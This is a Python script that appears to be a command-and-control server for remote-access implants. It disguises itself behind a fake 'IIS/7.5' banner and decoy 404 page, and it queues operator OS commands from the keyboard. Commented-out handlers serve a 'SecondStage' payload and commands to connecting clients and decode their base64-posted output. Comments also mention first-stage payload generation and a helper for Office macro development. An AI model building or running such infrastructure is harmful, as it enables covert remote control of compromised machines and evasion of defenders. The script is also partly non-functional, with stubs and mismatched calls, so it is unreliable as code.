#!/usr/bin/python3

import socket, ssl, _thread, os, requests, base64, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from OpenSSL import crypto, SSL # pip install pyOpenSSL
from collections import deque # Use for queue
#########
# Server Settings:
####
SERVER_PORT = 8080
USE_HTTPS = False
HOST_NAME = 'localhost'

LOCAL_IP = socket.gethostbyname(socket.gethostname())

# IP = '0.0.0.0'
# PORT = 443
# AESKey = 'This is a key123'
# AESIV =  'This is an IV456'

# Keyboard Input Commands
COMMANDS = deque()
#////////
# End Server Settings
#///////


#########
# Web Server Settings:
####
class WebServerHandler(BaseHTTPRequestHandler):
    '''Set Webserver Version'''
    server_version = 'IIS/7.5'
    sys_version = '7.5'

    def _set_headers(self, errcode=200):
        '''Set Response Headers'''
        self.send_response(errcode)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def NotFoundPage(self):
        '''Not Found Page'''
        source = """<!doctype html>
                <html lang="en">
                <head>
                <title>Not Found</title>
                </head>
                <body>
                <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
                </body>
                </html>
                """
        self.wfile.write(bytes(source, "utf-8"))

    # Handler for the GET requests
    def do_GET(self):
        self._set_headers(errcode=404)
        self.NotFoundPage()


    # def do_GET(self):
    #     global commands

    #     self._set_headers()
    #     if 'client' in self.path:

    #         self.wfile.write(SecondStage())

    #         now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    #         IP = self.client_address[0]
    #         try:
    #             UserAgent = self.headers['User-Agent']
    #             WriteLogs('\n\t [*] %s Connection from %s - %s' % (now, IP, UserAgent))
    #         except:
    #             WriteLogs('\n\t [*] %s Connection from %s ' % (now, IP))


    #     if len(commands)>0:
    #         self.wfile.write(commands[0])
    #         del commands[0]
    #     else:
    #         self.wfile.write('')

    # def do_HEAD(self):
    #     self._set_headers()

    # def do_POST(self):
    #     # Doesn't do anything with posted data
    #     self._set_headers()
    #     content_length = self.headers.getheaders('content-length')
    #     length = int(content_length[0]) if content_length else 0
    #     post_body = base64.decodestring(self.rfile.read(length)).decode('utf8')

    #     now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    #     IP = self.client_address[0]
    #     WriteLogs('\n\t [*] %s Response from %s -  %s' % (now, IP, post_body))

    #     print('\r\n [+] Command Output (if output is empty type command again): \n' + post_body + '#')
    #     return


#////////
# END Web Server Settings
#///////

class WebServerThread(ThreadingMixIn,HTTPServer):
    pass


#########
# Generate Self Signed Certificate:
####
def cert_gen(DOMAIN):
    PASSPHRASE = 'pass'

    # Generate Private Key
    print('[*] Generate Private Key:')
    os.system('export PASSPHRASE=' + PASSPHRASE + ' && openssl genrsa -des3 -out ' + DOMAIN + '.key -passout env:PASSPHRASE 2048')

    # Certificate details
    subj="/C=US/ST=OR/O=Blah/localityName=Portland/commonName=" + DOMAIN + "/organizationalUnitName=BlahBlah/emailAddress=admin@example.com/"
    # Generate the CSR
    print('[*] Generate CSR')
    os.system('export PASSPHRASE=' + PASSPHRASE + ' && openssl req -new -batch -subj ' + subj + ' -key ' + DOMAIN + '.key -out ' + DOMAIN + '.csr -passin env:PASSPHRASE')
    #print('[*] Duplicate Key')
    os.system('cp ' + DOMAIN + '.key ' + DOMAIN + '.key.org')
    # Strip the password so we don't have to type it every time we restart Apache
    os.system('export PASSPHRASE=' + PASSPHRASE + ' && openssl rsa -in ' + DOMAIN + '.key.org -out ' + DOMAIN +'.key -passin env:PASSPHRASE')
    # Generate the cert (good for 10 years)
    os.system('openssl x509 -req -days 3650 -in ' + DOMAIN + '.csr -signkey ' + DOMAIN + '.key -out ' + DOMAIN + '.crt')

    #os.system('openssl req -newkey rsa:4096  -keyout privkey.pem -x509 -days 365 -out certificate.pem -subj ' + subj)

#////////
# END Generate Certificate
#///////

def MyExternalIP(url='http://myexternalip.com/raw'):
    '''Get Server External IP Address'''
    external_ip = str(requests.get(url).text)
    return external_ip

def Encode(string):
    '''Encode String to Base64'''
    encoded_string = base64.b64encode(string.encode('ascii')).decode('ascii')
    return encoded_string

def Decode(string):
    '''Decode String from Base64'''
    decoded_string = base64.b64decode(string.encode('ascii')).decode('ascii')
    return decoded_string

def chunkstring(string, length):
    '''Split String in multiple chunks with the same length'''
    '''Used for Office Macro Development'''
    return (string[0+i:length+i] for i in range(0, len(string), length))

def WriteLogs(agent_name, line):
    directory = './logs/'
    if not os.path.exists(directory):
        os.makedirs(directory)

    fname = str(directory) + str(agent_name) + '.txt'
    f = open(fname, "a")
    f.write(str(line) + '\n')
    f.close()


def ReadCMD():
    '''Read input from keyboard.'''
    print('[*] Type OS commands:')
    CMD = input("# ")
    COMMANDS.append(CMD)
    #print(commands, commands[0])
    #del commands[0]

def run():
    WebSrv = WebServerThread(('0.0.0.0', SERVER_PORT), WebServerHandler)

    if USE_HTTPS:
        PROTOCOL = 'https'
        DOMAIN='test.local'
        cert_gen(DOMAIN)
        WebSrv.socket = ssl.wrap_socket(WebSrv.socket, keyfile='./' + DOMAIN + '.key', certfile='./' + DOMAIN + '.crt', server_side=True)
        # openssl req -newkey rsa:2048  -keyout privkey.pem -x509 -days 36500 -out certificate.pem
    else:
        PROTOCOL = 'http'

    try:
        print('[+] Server started on port: %d' % (SERVER_PORT))
        print('[+] Server URL: %s://%s:%d' % (PROTOCOL, LOCAL_IP, SERVER_PORT))
        # Wait forever for incoming http requests
        WebSrv.serve_forever()
    except KeyboardInterrupt:
        print('[!] Closing server. Please wait ...')
        WebSrv.socket.close()

if __name__ == '__main__':
    # Run webserver in a new thread:
    _thread.start_new_thread(run, ())
    time.sleep(0.1)

    # print('[+] Second Stage URL: %s' % (BuildURL()))
    # print('[+] First Stage Decoded Payload: %s' % (FirstStage(BuildURL())))
    # print('[+] First Stage Encoded Payload: %s' % (Encode(FirstStage(BuildURL()))))


    while True:
        ReadCMD()
